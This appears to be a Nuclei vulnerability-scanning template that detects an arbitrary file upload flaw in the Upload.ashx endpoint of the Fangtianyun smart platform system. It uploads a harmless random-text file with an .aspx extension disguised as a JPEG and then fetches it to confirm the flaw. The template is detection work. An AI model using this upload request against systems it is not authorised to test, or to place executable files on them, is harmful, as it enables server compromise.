id: poc-ftyerp-upload-ashx-anyfile-upload
info:
  name: 方天云智慧平台系统 Upload.ashx 任意文件上传漏洞
  author: ProjectDiscoveryAI
  severity: critical
  tags: file-upload

variables:
  t1: "{{rand_text_alphanumeric(4)}}"
  t2: "{{base64(t1)}}"

flow: |
  http(1) && http(2)

http:
  - id: upload-file
    method: POST
    path:
      - "{{BaseURL}}/Upload.ashx"
    headers:
      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundarySl8siBbmVicABvTX"
    body: |-
      ------WebKitFormBoundarySl8siBbmVicABvTX
      Content-Disposition: form-data; name="file"; filename="{{t1}}.aspx"
      Content-Type: image/jpeg

      {{t2}}
      ------WebKitFormBoundarySl8siBbmVicABvTX--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "\\.aspx"
    extractors:
      - type: regex
        name: uploaded_path
        group: 1
        regex:
          - "(?P<path>.*)\\.aspx"
        internal: true

  - id: verify-upload
    method: GET
    path:
      - "{{BaseURL}}/UploadFile/CustomerFile/{{uploaded_path}}.aspx"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "{{t2}}"
